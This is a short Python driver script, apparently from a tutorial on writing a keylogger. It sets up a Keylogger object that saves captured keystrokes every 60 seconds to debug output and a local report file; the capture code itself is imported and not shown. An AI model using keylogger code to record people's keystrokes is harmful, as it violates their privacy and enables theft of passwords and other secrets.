# https://www.thepythoncode.com/article/write-a-keylogger-python

from keylogger import Keylogger
import keylogger_logger
import signal
import sys


if __name__ == '__main__':
    signal.signal(signal.SIGINT, lambda x, y: sys.exit(0))
    
    keylogger = Keylogger().save_each(60)
    keylogger.add_logger(keylogger_logger.DebugLogger())
    keylogger.add_logger(keylogger_logger.FileLogger('./keylogger-report.txt'))
    keylogger.wait()